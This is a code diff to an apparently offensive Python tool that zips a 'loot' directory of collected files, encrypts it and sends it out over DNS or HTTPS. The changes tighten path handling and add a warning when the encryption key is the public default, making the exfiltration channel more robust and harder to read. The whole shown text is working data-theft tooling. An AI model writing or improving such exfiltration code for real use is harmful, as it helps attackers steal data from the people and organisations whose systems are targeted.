@@ -46,16 +46,18 @@ def _compress_encrypt(data: bytes, key_str: str) -> bytes:
 
 def package_loot(loot_dir: Path, target_file: str | None = None) -> bytes:
     """Zip loot directory (or single file) and return raw bytes."""
+    # Resolve once so containment checks are consistent even if cwd changes
+    loot_root = loot_dir.resolve()
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         if target_file:
-            p = (loot_dir / target_file).resolve()
-            if p.is_file() and p.is_relative_to(loot_dir.resolve()):
+            p = (loot_root / target_file).resolve()
+            if p.is_file() and p.is_relative_to(loot_root):
                 zf.write(p, p.name)
         else:
-            for f in sorted(loot_dir.rglob("*")):
+            for f in sorted(loot_root.rglob("*")):
                 if f.is_file():
-                    zf.write(f, str(f.relative_to(loot_dir)))
+                    zf.write(f, str(f.relative_to(loot_root)))
     return buf.getvalue()
 
 
@@ -177,7 +179,16 @@ def exfil_loot(
       aes_key, dns_domain, dns_server, https_url, https_token, https_verify_tls
     method: 'dns' | 'https'
     """
-    aes_key   = cfg.get("aes_key",   "change-me-to-32-byte-secret-key!")
+    _DEFAULT_KEY = "change-me-to-32-byte-secret-key!"
+    aes_key = cfg.get("aes_key", _DEFAULT_KEY)
+    if not aes_key or aes_key == _DEFAULT_KEY:
+        import warnings
+        warnings.warn(
+            "Exfil AES key is the public default — change 'aes_key' in config.json. "
+            "All exfil traffic can be decrypted by anyone with the source code.",
+            stacklevel=2,
+        )
+
     raw       = package_loot(loot_dir, target_file)
     encrypted = _compress_encrypt(raw, aes_key)
 
